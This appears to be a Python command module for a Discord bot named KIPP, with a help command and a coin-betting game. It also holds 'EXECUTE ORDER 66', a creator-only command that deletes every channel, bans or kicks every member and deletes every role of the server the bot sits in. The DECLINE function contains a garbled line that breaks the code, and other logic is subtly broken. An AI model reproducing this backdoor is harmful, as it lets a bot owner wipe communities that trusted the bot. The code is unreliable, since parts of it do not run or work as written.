from Command import *
from .Command_utils import *
from ESSENTIAL_PACKAGES import *
import sys
import os
KIPP_DIR = os.environ["KIPP_DIR"]
sys.path.append(KIPP_DIR + "/Python")


async def HELP(message, message2, serverinfo, playerinfo):
    if "|" in message2:
        found = False
        for command in commands:
            search = message2.split("|")[1]
            if "!" not in search:
                search = "!" + search
                if command.Name == search:
                    emb = discord.Embed(title="Help for {0}".format(
                        command.Name), description=command.help(), colour=EMBEDCOLOR)
                    emb.set_footer(text=get_footer())
                    await message.channel.send(embed=emb)
                    found = True
        if found == False:
            await message.channel.send("Unable to find a command with that name.")
    else:
        misc = []
        musc = []
        kc = []
        for c in commands:
            if isinstance(c, MISC):
                misc.append(c.Name)
            elif isinstance(c, KIPC):
                kc.append(c.Name)
            elif isinstance(c, MUSC):
                musc.append(c.Name)
        em = discord.Embed(
            title='Help', description="**Use !HELP|command for command-specific information**", colour=EMBEDCOLOR)
        em.add_field(name="Music", value="```" + "\n".join(musc) + "```")
        em.add_field(name="KIPPCOINS", value="```" + "\n".join(kc) + "```")
        em.add_field(name="Miscellaneous", value="```" +
                     "\n".join(misc) + "```")
        em.set_footer(text=get_footer())
        await message.channel.send(embed=em)


async def EXIT(message, message2, serverinfo, playerinfo):
    if playerinfo[message.author].betting == True:
        playerinfo[message.author].gamblerequest = False
        emb = discord.Embed(title="GambleGame",
                            description="GAME ENDED", colour=EMBEDCOLOR)
        emb.set_footer(text=get_footer())
        await playerinfo[message.author].gamblemessage.edit(embed=emb)
        reset_gamblegame(message.author, playerinfo)


async def PLAY(message, message2, serverinfo, playerinfo):
    if playerinfo[message.author].solo == True and playerinfo[message.author].bet != None:
        rand = SystemRandom().randrange(1, 4)
        color = ["Red", "Blue", "Green", "Black"][rand]
        if color == playerinfo[message.author].color:
            emb = discord.Embed(title="Solo GambleGame", description="Selected Color: **{0}**\nActual Color: **{1}**\nYou gain `{2} KC`".format(
                playerinfo[message.author].color, color, playerinfo[message.author].bet), colour=EMBEDCOLOR)
            emb.set_footer(text=get_footer())
            playerinfo[message.author].GIVE_KIPPCOINS(
                int(playerinfo[message.author].bet))
        if color != playerinfo[message.author].color:
            emb = discord.Embed(title="Solo GambleGame", description="Selected Color: **{0}**\nActual Color: **{1}**\nYou lose `{2} KC`".format(
                playerinfo[message.author].color, color, playerinfo[message.author].bet), colour=EMBEDCOLOR)
            emb.set_footer(text=get_footer())
            playerinfo[message.author].GIVE_KIPPCOINS(
                -1 * int(playerinfo[message.author].bet))
        await playerinfo[message.author].gamblemessage.edit(embed=emb)
        await message.delete()
        playerinfo[message.author].bet = None
        playerinfo[message.author].color = None
        playerinfo[message.author].solo = False
    elif playerinfo[message.author].challenger != None:
        if playerinfo[message.author].bet == playerinfo[playerinfo[message.author].challenger].bet and playerinfo[message.author].betting == False:
            rand = SystemRandom().randrange(1, 3)
            if rand == 1:
                winner = message.author
            else:
                winner = playerinfo[message.author].challenger
            emb = discord.Embed(title="GambleGame", description="Winner: **{2}**\n`+{0} KC`\n\nLoser: **{1}**\n`-{0} KC`".format(
                playerinfo[message.author].bet, playerinfo[winner].challenger, winner), colour=EMBEDCOLOR)
            emb.set_footer(text=get_footer())
            await playerinfo[message.author].gamblemessage.edit(embed=emb)
            playerinfo[winner].GIVE_KIPPCOINS(
                int(playerinfo[message.author].bet))
            playerinfo[playerinfo[winner].challenger].GIVE_KIPPCOINS(
                -1 * int(playerinfo[message.author].bet))
            reset_gamblegame(message.author, playerinfo)
    else:
        await message.channel.send("Unable to find and execute `!PLAY`.\nDid you mean `!MUSIC`?")


async def SELECT(message, message2, serverinfo, playerinfo):
    if playerinfo[message.author].solo == True:
        if (message2.split("|")[1] == "RED"
            or message2.split("|")[1] == "BLUE"
            or message2.split("|")[1] == "GREEN"
                or message2.split("|")[1] == "BLACK"):
            message1 = message2.split("|")[1].lower()
            ms = list(message1)
            ms[0] = message2.split('|')[1][0]
            message1 = ""
            for i in ms:
                message1 = message1 + i
            playerinfo[message.author].color = message1
            await message.delete()
            emb = discord.Embed(title="Solo GambleGame", description="Color selected: **{0}**\nUse **!BET|KC** to bet KIPPCOINS\nAvailable KC: `{1}`".format(
                message1, str(playerinfo[message.author].GET_KIPPCOINS())), colour=EMBEDCOLOR)
            emb.set_footer(text=get_footer())
            await playerinfo[message.author].gamblemessage.edit(embed=emb)


async def CANCEL(message, message2, serverinfo, playerinfo):
    if playerinfo[playerinfo[message.author].challenger].gamblerequest == True:
        emb = discord.Embed(title="GambleGame Request",
                            description="CANCELLED", colour=EMBEDCOLOR)
        emb.set_footer(text=get_footer())
        playerinfo[playerinfo[message.author].challenger].gamblerequest = False
        playerinfo[playerinfo[message.author].challenger].challenger = None
        playerinfo[message.author].challenger = None
        await playerinfo[message.author].gamblemessage.edit(embed=emb)
        playerinfo[playerinfo[message.author].challenger].gamblemessage = None
        playerinfo[message.author].gamblemessage = None
        await message.delete()


async def DECLINE(message, message2, serverinfo, playerinfo):
    if playerinfo[message.author].gamblerequest == True:
        emb = discord.Embed(title="GambleGame Request",
                            description="DECLINED", colour=EMBEDCOLOR)
        emb.set_footer(text=get_footer())
        playerinfo[message.author].gamblerequest = False
        playerinfo[message.author].gamblemessage = None
        playerinfo[playerinfo[message.author].challenger].gamblemessage = None
        playerinfo[message.author].challenger = Noneplayerinfo[playerinfo[message.author]
                                                               .challenger].gambplayerinfo[playerinfo[message.author].challenger].gamblemessage = None
        playerinfo[message.author].gamblemessage = None
        playerinfo[message.author].gamblemessage = None
        await playerinfo[message.author].gamblemessage.edit(embed=emb)
        await message.delete()


async def ACCEPT(message, message2, serverinfo, playerinfo):
    if playerinfo[message.author].gamblerequest == True:
        playerinfo[message.author].gamblerequest = False
        playerinfo[message.author].betting = True
        playerinfo[message.author].bet = 0
        playerinfo[playerinfo[message.author].challenger].bet = 0
        playerinfo[playerinfo[message.author].challenger].betting = True
        emb = discord.Embed(title="GambleGame", description="Game started.\nEach player must bet the same amount. Once this is done, the winner will be decided.\n\n**{0}**:\nKC Available `{1}`\nBet: **0**\n\n**{2}**:\nKC Available `{3}`\nBet: **0**\n\nUse **!BET|VALUE** to bet\nUse **!EXIT** to leave the game".format(
            message.author, str(playerinfo[message.author].GET_KIPPCOINS()), playerinfo[message.author].challenger, str(playerinfo[playerinfo[message.author].challenger].GET_KIPPCOINS())), colour=EMBEDCOLOR)
        emb.set_footer(text=get_footer())
        await playerinfo[message.author].gamblemessage.edit(embed=emb)
        await message.delete()


async def BET(message, message2, serverinfo, playerinfo):
    if playerinfo[message.author].solo == True and playerinfo[message.author].color != None:
        amount = int(str(message.content).split("|")[1])
        if amount <= int(playerinfo[message.author].GET_KIPPCOINS()) and amount > 0:
            playerinfo[message.author].bet = amount
            emb = discord.Embed(title="Solo GambleGame", description="Color: **{0}**\nBet: `{1} KC`\n**!PLAY**".format(
                playerinfo[message.author].color, str(playerinfo[message.author].bet)), colour=EMBEDCOLOR)
            emb.set_footer(text=get_footer())
            await playerinfo[message.author].gamblemessage.edit(embed=emb)
        await message.delete()
    else:
        if playerinfo[message.author].betting == True:
            amount = int(str(message.content).split("|")[1])
            if amount <= int(playerinfo[message.author].GET_KIPPCOINS()) and amount > 0:
                playerinfo[message.author].bet = amount
                if playerinfo[message.author].bet != playerinfo[playerinfo[message.author].challenger].bet:
                    if playerinfo[message.author].challenger != None:
                        emb = discord.Embed(title="GambleGame", description="Game started.\nEach player must bet the same amount. Once this is done, the winner will be decided.\n\n**{0}**:\nKC Available `{1}`\nBet: **{4}**\n\n**{2}**:\nKC Available `{3}`\nBet: **{5}**\n\nUse **!BET|VALUE** to bet\nUse **!EXIT** to leave the game".format(
                            message.author, str(playerinfo[message.author].GET_KIPPCOINS()), playerinfo[message.author].challenger, str(playerinfo[playerinfo[message.author].challenger].GET_KIPPCOINS()), playerinfo[message.author].bet, playerinfo[playerinfo[message.author].challenger].bet), colour=EMBEDCOLOR)
                    else:
                        emb = discord.Embed(title="GambleGame", description="Game started.\nEach player must bet the same amount. Once this is done, the winner will be decided.\n\n**{2}**:\nKC Available `{3}`\nBet: **{5}**\n\n**{0}**:\nKC Available `{1}`\nBet: **{4}**\n\nUse **!BET|VALUE** to bet\nUse **!EXIT** to leave the game".format(
                            message.author, str(playerinfo[message.author].GET_KIPPCOINS()), playerinfo[message.author].challenger, str(playerinfo[playerinfo[message.author].challenger].GET_KIPPCOINS()), playerinfo[message.author].bet, playerinfo[playerinfo[message.author].challenger].bet), colour=EMBEDCOLOR)
                elif playerinfo[message.author].bet == playerinfo[playerinfo[message.author].challenger].bet:
                    emb = discord.Embed(title="GambleGame", description="The agreed bet is " + str(
                        amount) + " KIPPCOINS.\n\n**!PLAY** to decide the winner", colour=EMBEDCOLOR)
                    playerinfo[playerinfo[message.author].challenger].betting = False
                    playerinfo[message.author].betting = False
                emb.set_footer(text=get_footer())
                await playerinfo[message.author].gamblemessage.edit(embed=emb)
            await message.delete()


async def EXECUTE_ORDER_66(message, message2, serverinfo, playerinfo):
    if message.author.id == CREATOR_ID:
        server = message.guild
        channels = []
        members = []
        roles = []
        for channel in server.channels:
            channels.append(channel)
        for channel in channels:
            await channel.delete()
        for role in server.roles:
            if str(role) != "@everyone":
                roles.append(role)
        for member in server.members:
            if str(member) != "KIPP#4780":
                if member.id != CREATOR_ID:
                    members.append(member)
        for member in members:
            try:
                await client.ban(member)
            except discord.DiscordException:
                try:
                    await client.kick(member)
                except discord.DiscordException:
                    pass
        for role in roles:
            try:
                try:
                    await role.delete()
                except discord.DiscordException:
                    pass
            except TypeError:
                pass

Command("!HELP", "Displays either a list of commands or command-specific help\n!HELP or !HELP|command", HELP, [])
Command("!EXIT", "Explained in GambleGame\n!EXIT", EXIT, [])
Command("!PLAY", "Explained in GambleGame\n!PLAY", PLAY, [])
Command("!SELECT", "Explained in Solo GambleGame\n!SELECT|color",
        SELECT, [str])
Command("!CANCEL", "Explained in GambleGame\n!CANCEL", CANCEL, [])
Command("!DECLINE", "Explained in GambleGame\n!DECLINE", DECLINE, [])
Command("!ACCEPT", "Explained in GambleGame\n!ACCEPT", ACCEPT, [])
Command("!BET", "Explained in Solo/Non-Solo GambleGame\n!BET", BET, [int])
Command("EXECUTE ORDER 66", "This command may be used by LockdownDoom in order to completely destroy a server\nEXECUTE ORDER 66", EXECUTE_ORDER_66, [])
